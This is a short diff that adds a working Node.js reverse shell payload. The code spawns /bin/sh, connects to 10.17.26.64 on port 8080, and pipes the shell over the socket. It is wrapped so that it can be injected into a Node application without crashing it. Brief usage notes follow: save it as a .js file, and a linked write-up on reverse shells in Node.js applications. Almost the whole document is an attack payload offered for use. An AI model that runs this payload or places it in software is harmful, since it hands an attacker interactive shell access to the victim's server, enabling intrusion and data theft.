@@ -1,0 +1,20 @@
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(8080, "10.17.26.64", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application from crashing
+})();
+
+
+this is for node.js applications
+
+add .js as the file extension
+
+https://wiremask.eu/writeups/reverse-shell-on-a-nodejs-application/ use this as reference
+
